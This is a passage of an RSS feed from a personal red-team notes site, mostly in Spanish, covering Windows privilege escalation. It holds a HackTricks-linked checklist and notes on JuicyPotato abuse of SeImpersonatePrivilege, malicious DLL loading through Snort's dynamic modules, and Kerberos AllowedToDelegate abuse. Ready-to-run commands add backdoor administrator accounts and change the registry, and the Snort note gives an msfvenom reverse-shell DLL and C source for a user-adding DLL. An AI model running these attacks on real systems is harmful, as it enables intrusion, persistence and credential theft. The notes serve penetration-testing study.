<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-credentials" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-credentials" target="_blank"><strong></strong></a>Cached Credentials?
<br>Check if any <a data-tooltip-position="top" aria-label="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/windows-av-bypass/README.md" rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/windows-av-bypass/README.md" target="_blank"><strong></strong></a>AV
<br><a data-tooltip-position="top" aria-label="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/README.md#applocker-policy" rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/README.md#applocker-policy" target="_blank"><strong></strong></a>AppLocker Policy?
<br><a data-tooltip-position="top" aria-label="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control/README.md" rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control/README.md" target="_blank"><strong></strong></a>UAC
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups" target="_blank"><strong></strong></a>User Privileges
<br>Check <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups" target="_blank"><strong></strong> user <strong></strong></a>currentprivileges
<br>Are you <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#privileged-groups" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#privileged-groups" target="_blank"><strong></strong></a>member of any privileged group?
<br>Check if you have <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation" target="_blank">any of these tokens enabled</a>: SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege ?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#logged-users-sessions" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#logged-users-sessions" target="_blank"><strong></strong></a>Users Sessions?
<br>Check <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#home-folders" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#home-folders" target="_blank"><strong></strong></a>users homes (access?)
<br>Check <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#password-policy" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#password-policy" target="_blank"><strong></strong></a>Password Policy
<br>What is <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#get-the-content-of-the-clipboard" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#get-the-content-of-the-clipboard" target="_blank"><strong></strong></a>inside the Clipboard?
<br><br>
<br>Check current <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#network" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#network" target="_blank"><strong></strong> <strong></strong></a>networkinformation
<br>Check hidden local services restricted to the outside
<br><br>
<br>Processes binaries <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#file-and-folder-permissions" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#file-and-folder-permissions" target="_blank"><strong></strong></a>file and folders permissions
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#memory-password-mining" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#memory-password-mining" target="_blank"><strong></strong></a>Memory Password mining
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#insecure-gui-apps" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#insecure-gui-apps" target="_blank"><strong></strong></a>Insecure GUI apps
<br>Steal credentials with interesting processes via ProcDump.exe ? (firefox, chrome, etc ...)
<br><br>
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#permissions" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#permissions" target="_blank">Can you <strong></strong>?</a>modify any service
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path" target="_blank">Can you <strong></strong> the <strong></strong> that is <strong></strong> by any <strong></strong>?</a>modifybinaryexecutedservice
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions" target="_blank">Can you <strong></strong> the <strong></strong> of any <strong></strong>?</a>modifyregistryservice
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths" target="_blank">Can you take advantage of any <strong></strong> binary <strong></strong>?</a>unquoted servicepath
<br><br>
<br>Write <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#write-permissions" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#write-permissions" target="_blank"><strong></strong></a>permissions on installed applications
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup" target="_blank"><strong></strong></a>Startup Applications
<br>Vulnerable <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#drivers" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#drivers" target="_blank"><strong></strong></a>Drivers
<br><br>
<br>Can you write in any folder inside PATH?
<br>Is there any known service binary that tries to load any non-existant DLL?
<br>Can you write in any binaries folder?
<br><br>
<br>Enumerate the network (shares, interfaces, routes, neighbours, ...)
<br>Take a special look at network services listening on localhost (127.0.0.1)
<br><br>
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#winlogon-credentials" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#winlogon-credentials" target="_blank"><strong></strong></a>Winlogon credentials
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault" target="_blank"><strong></strong></a>Windows Vault credentials that you could use?
<br>Interesting <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi" target="_blank"><strong></strong></a>DPAPI credentials? 
<br>Passwords of saved <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wifi" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wifi" target="_blank"><strong></strong></a>Wifi networks?
<br>Interesting info in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#saved-rdp-connections" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#saved-rdp-connections" target="_blank"><strong></strong></a>saved RDP Connections?
<br>Passwords in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#recently-run-commands" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#recently-run-commands" target="_blank"><strong></strong></a>recently run commands?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager" target="_blank"><strong></strong></a>Remote Desktop Credentials Manager passwords?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe" target="_blank"><strong></strong> exists</a>AppCmd.exe? Credentials?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm" target="_blank"><strong></strong></a>SCClient.exe? DLL Side Loading?
<br><br>
<br>Putty: <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#putty-creds" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#putty-creds" target="_blank"><strong></strong></a>Creds and <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#putty-ssh-host-keys" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#putty-ssh-host-keys" target="_blank"><strong></strong></a>SSH host keys
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry" target="_blank"><strong></strong></a>SSH keys in registry?
<br>Passwords in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unattended-files" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unattended-files" target="_blank"><strong></strong></a>unattended files?
<br>Any <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#sam-and-system-backups" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#sam-and-system-backups" target="_blank"><strong></strong></a>SAM &amp; SYSTEM backup?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cloud-credentials" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cloud-credentials" target="_blank"><strong></strong></a>Cloud credentials?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#mcafee-sitelist.xml" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#mcafee-sitelist.xml" target="_blank"><strong></strong></a>McAfee SiteList.xml file?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-gpp-pasword" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-gpp-pasword" target="_blank"><strong></strong></a>Cached GPP Password?
<br>Password in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#iis-web-config" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#iis-web-config" target="_blank"><strong></strong></a>IIS Web config file?
<br>Interesting info in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#logs" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#logs" target="_blank"><strong></strong> <strong></strong></a>weblogs?
<br>Do you want to <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ask-for-credentials" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ask-for-credentials" target="_blank"><strong></strong></a>ask for credentials to the user?
<br>Interesting <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-in-the-recyclebin" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-in-the-recyclebin" target="_blank"><strong></strong></a>files inside the Recycle Bin?
<br>Other <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry" target="_blank"><strong></strong></a>registry containing credentials?
<br>Inside <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history" target="_blank"><strong></strong></a>Browser data (dbs, history, bookmarks, ...)?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#generic-password-search-in-files-and-registry" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#generic-password-search-in-files-and-registry" target="_blank"><strong></strong></a>Generic password search in files and registry
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#tools-that-search-for-passwords" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#tools-that-search-for-passwords" target="_blank"><strong></strong></a>Tools to automatically search for passwords
<br><br>
<br>Have you access to any handler of a process run by administrator?
<br><br>
<br>Check if you can abuse it
]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/1.-windows-privilege-escalation-checklist.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/1. Windows Privilege Escalation CHECKLIST.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 15 May 2024 20:19:20 GMT</pubDate></item><item><title><![CDATA[SeImpersonatePrivilege]]></title><description><![CDATA[ 
 <br><br><br>El privilegio SeImpersonatePrivilege es un privilegio de Windows que permite a un proceso tomar la identidad de otro usuario o cuenta de servicio. Este privilegio es utilizado por los servicios de Windows y otros procesos para llevar a cabo tareas en nombre de un usuario o cuenta de servicio específica, incluso si el proceso que las ejecuta tiene un nivel de privilegio más bajo.<br><br><br>JuicyPotato es una técnica utilizada en el ámbito de la seguridad informática para aprovechar ciertas vulnerabilidades y lograr una escalada de privilegios en sistemas Windows. JuicyPotato se basa en una debilidad en la forma en que Windows maneja los nombres de objetos COM (Component Object Model). Permite a un atacante obtener el privilegio SeImpersonatePrivilege para ejecutar código malicioso con los privilegios elevados asociados a dicho privilegio<br>
Para elevar privilegios abusando del privilegio SeImpersonatePrivilege haciendo uso de la técnica Juicy Potato, podríamos descargarnos el binario encargado de explotar esta vulnerabilidad como <a data-tooltip-position="top" aria-label="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" rel="noopener nofollow" class="external-link" href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank">JuicyPotato.exe</a> o <a data-tooltip-position="top" aria-label="https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1" rel="noopener nofollow" class="external-link" href="https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1" target="_blank">JuicyPotatoNG</a><br>
En ambos, al traspasarlo a la máquina victima y ejecutarlo, podríamos realizar acciones privilegiadas y ejecutar comandos como el user Administrator.<br>&gt; .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
Copy<br>En este ejemplo solo estamos ejecutando el comando whoami, pero podríamos hacer uso de esto para tener completo acceso al sistema: <br>Agregamos el usuario y su contraseña al sistema<br>&gt; .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user {name} {password} /add" -l 1337
Copy<br>Agregamos el usuario creado al grupo Administrators<br>&gt;  .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net localgroup {name} Administrators /add" -l 1337
Copy<br>En este punto podríamos verificar con herramientas como crackmapexec si ya tenemos acceso al sistema siendo administradores: <br>crackmapexec smb {target_ip} -u '{name}' -p '{password}'
Copy<br>En caso de ver un (Pwned!) podríamos conectarnos de manera remota con el máximo de privilegios, en caso de que no, aveces suele ser necesario retocar un componente de un registro (LocalAccountTokenFilterPolicy)<br>&gt;  .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
# reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
Copy<br>Por lo que ahora si volvemos a validar con crackmapexec veríamos el (Pwned!) y podríamos conectarnos con impacket-psexec proporcionando el usuario que hemos creado y la contraseña.<br>impacket-psexec WORGROUP\{name}@{target_ip} cmd.exe
Copy<br><br>Es importante a tener en cuenta que a la hora de ejecutar este comando lo que se está intentando realizar es subir un binario malicioso en un recurso compartido a nivel de red en el cual tengamos permisos de escritura, en caso de no existir uno, podría ser necesario adicionalmente crear uno. <br>&gt;  .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abusando-de-seimpersonateprivilege.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Abusando de SeImpersonatePrivilege.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:06 GMT</pubDate></item><item><title><![CDATA[Modules &amp; Dynamic Modules]]></title><description><![CDATA[ 
 <br><br>Un module (Módulo) en Windwos generalmente se refiere a un archivo que contiene código ejecutable y recursos que epueden ser utilizados por un programa. Los tipos más comunes de móodulos son:<br>
<br>Ejecutables (.exe): Archivos que contienen un programa completo que puede ser ejecutado por el sistema operativo.
<br>Librerías de Enlace Dinámico (.dll): Archivos que contiene código y datos que pueden ser utilizados por múltiples programas simultáneamente.
<br>Los módulos permiten que el código sea compartido entre diferentes programas, lo que reduce la duplicación de código y facilita el mantenimiento.<br>Por otro lado, los Dynamic Modules (Módulos dinámicos) son módulos que pueden ser cargados en tiempo de ejecución, el lugar de estar vinculados estáticamente en el momento de la compilación. Este concepto se aplica principalmente a las DLLs (Dynamic Link Libraries). En otras palabras, una aplicación puede decidir en tiempo de ejecución si necesita cargar un módulo específico y puede descargarlo cuando ya no lo necesita.<br><br><br>El abuso de módulos dinámicos es una técnica que aprovecha cómo las aplicaciones cargan dinámicamente bibliotecas de enlace dinámico (DLLs) o módulos para inyectar código malicioso o sustituir módulos legítimos. Esto puede permitir a un atacante ejecutar código con privilegios elevados o acceder a recursos restringidos.<br>Cuando una aplicación necesita una funcionalidad adicional o recursos que no están compilados en el ejecutable principal, puede cargar módulos dinámicos (Como DLLs) en tiempo de ejecución, en este momento, Windows sigue una secuencia de rutas específicas para buscar el archivo necesario. Si un atacante logra colocar una DLL maliciosa en uan de las ubicaciones que se buscan antes que la DLL legítima, la aplicación puede cargar y ejecutar código malicioso. (Esto se lo conoce como DLL Hijacking)<br>Pero, en algunos casos, existen herramientas que si revisamos su manual de uso, podemos encontrarnos con secciones que hacen alución a Dynamic Modules load, donde nos indican el funcionamiento y uso de la posibiilidad de la carga de módulos dinámicos, lo que nos puede abrir la ventana de explotación creando y cargando nuestro propio dynamic module sin necesidad de secuestrar uno (DLL Hijacking). <br><br><br>La explicación de explotación de está técnica será dada con el conocido software Snort, el cual es un sistema de detección de intrusiones a nivel de red (IDS - Intrusion Detection System) de código abierto.<br>En este caso podríamos estar enfrentandonos a un sistema que hace uso de este software y podríamos pensar en hacer una breve búsqueda del manual de uso de está misma para visualizar si existe algun apartado referido a la carga de módulos dynámicos.<br>Tras llevar a cabo esta acción, nos encontramos en el manual de uso, sección "Dynamic Modules":<br><img alt="dynamic_module_injection_software_manual_example.png" src="https://dobliuw.com/lib/media/dynamic_module_injection_software_manual_example.png"><br>Podemos ver que nos indica las diferentes maneras de carga de módulos dinámicos que lleva a cabo esta herramienta, tanto para los preprocessor, laengine y  la detection, y así mismo vemos que tiene la opción de que se le indique una .dll en particular (file) o un directorio en el cual encontraremos múltiples DLLs (shared library path). En este caso podríamos buscar el archivo de configuración de esta herramienta (Archivo en el cual se configuran estas "opciones" - snort.conf).<br>cat snort.conf | grep -i dynamicpreprocessor
Copy<br>Tras la ejecución del comando anterior, podríamos ver un stdout tal que así:<br>dynamipreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor
Copy<br>Tras este output, podemos entender que la carga de módulos dinámicos para los preprocessor se esta haciendo a nivel de directorio y este esta configurado en C:\Snort\lib\snort_dynamicpreprocessor, donde en caso de disponer de permisos de escritura, podríamos crear una .dll maliciosa para que a la hora de la carga de estas DLLs, se carge nuestra DLL maliciosa y ejecute la tarea que hayamos indicado. <br>Facilmente podríamos crear una DLL maliciosa con la herramienta msfvenom para obtener una simple reverse shell:<br>msfvenom -p /windows/x64/shell_reverse_tcp LHOST={our_IP} LPORT={our_PORT} -f dll -a x64 -o malicious.dll
Copy<br>Tras esta ejecución, tendrémos una DLL maliciosa que tras ser cargada dinámicamente por un software, nos enviara una reverse shell a un determinado puerto por nuestra IP de atacante. Es importante tener en cuenta que en sistemas avanzados con alta seguridad, payloads generados por herramientas populares como msfvenom pueden ser simplemente detectados, por lo que llevar a cabo este proceso de manera manual podría ser mucho más óptimo, para esto podríamos seguir guías como la de <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">HackTricks</a>.<br>Podemos crear distintas DLLs según el compilador que tengamos, por ejemplo, para compiladores como x86_64-w64-mingw32-gcc o i686-w64-mingw32-gcc podríamos crear un simple DLL con el siguiente código:<br>
<br>Archivo pre_dll.c
<br>#include &lt;windows.h&gt;
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /c net user dobliuw dobliuw123! /add; net localgroup administrators dobliuw /add");
        ExitProcess(0);
    }
    return TRUE;
}
Copy<br>Una vez creado el archivo, deberemos usar el compilador para crear la DLL:<br>x86_64-w64-mingw32-gcc pre_dll.c -shared -o final.dll
Copy<br>Una vez realizado esto, tendremos nuestra DLL maliciosa (final.dll, por ejemplo) la cual podremos (Siguiendo el ejemplo) mover, copiar, o crear de primeras, en el directorio de nuestro interes (C:\Snort\lib\snort_dynamicpreprocessor, por ejemplo). Una vez que esta DLL sea cargada de manera dinámica en proceso de ejecución, se ejecutará el código indicado, donde en caso de que el proceso principal que carga las DLLs (En nuestro ejemplo Snort) sea ejecutado por el usuario Administrator, estaremos creando un nuevo usuario y agregandolo al grupo de administrators.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abusing-dynamic-modules.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/Abusing Dynamic Modules.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 21 Aug 2024 22:35:46 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/dynamic_module_injection_software_manual_example.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/dynamic_module_injection_software_manual_example.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Abuso de AllowedToDelegate]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataque" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataque</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:ataque" class="tag" target="_blank" rel="noopener nofollow">#ataque</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> 
<br><br><br>El privilegio AllowedToDelegate (También conocido como SeEnableDelegationPrivilege) en Windows se refiere a un privilegio de seguridad que se puede asignar a una cuenta de usuario o grupo. Este privilegio permite que una cuenta delegue sus credenciales a otros servicios o sistemas en la red. <br>Cuando este privilegio es asignado a una cuenta, esta cuenta puede actuar como intermediario para la autenticación y la delegación de sus credencial4es a otros servicos o sistemas en la red. Esto significa que la cuenta puede proporcionar sus credenciales a otros servicios o sistemas para que puedan autenticarse en nombre de esa cuenta y realizar acciones en su nombre. <br><br><br>Al tener una cuenta con el privilegio AllowedToDelegate podríamos intentar impersonar a otro usuario como bien vimos, siendo así posible impersonar al usuario administrador para solicitar un ticket TGS el cual contiene el hash NTLM del usuario que lo solicita. <br>Para explotar esto, podríamos hacer uso de la herramienta impacket-getST para intentar obtener un ticket de servicio (TGS) para posteriormente solicitar acceso a un servicio específico dentro del AD. <br>La herramienta getST para abusar del privilegio AllowedToDelegate nos solicitará el SPN (Service Principal Name), es decir el nombre (identificador) único del servicio al que se le desea solicitar el TGS.<br>Para obtener esto, podríamos hacer uso de otra herramienta llamada pywerview, herramienta que se utiliza para enumerar y explotar acticos de Active Directory en entornos de Windows. <br>pywerview get-netcompute -u '{username}' -t {target_ip} --full-data 
Copy<br>Esto lo que hará es listar múltiple información dentro de ella una línea denominada "msds-allowedtodelegateto:" el cual será el nombre del SPN al que podremos solicitar el TGS. Una vez obtenido este, podemos proseguir con el ataque para solicitar un TGS.<br>impacket-getST -spn {spn_name} -impersonate Administrator {domain}/{username} -hashes :{NT_HASH}
Copy<br>A la hora de ejecutar el ataque, puede ser que no funcione por no estar sincronizada la hora con el AD. Para sincronizar la hora podríamos instalar la herramienta ntpdate (apt install ntpdate). <br>sudo ntpdate {target_IP}
sudo ntpdate -s {target_IP}
Copy<br>Una vez sincronizado el tiempo de nuestra máquina de atacantes con el AD, podremos hacer uso otra vez del comando de impacket-getST. Una vez ejecutado exitosamente nos alojara en el directorio de trabajo el archivo Administrator.ccache, el cual usaremos para autenticarnos al sistema haciendo uso de la autenticación de kerberos, por lo que primero deberíamos exportar una variable de entorno llamada KRB5CCNAME.<br>export KRB5CCNAME=Administrator.ccache
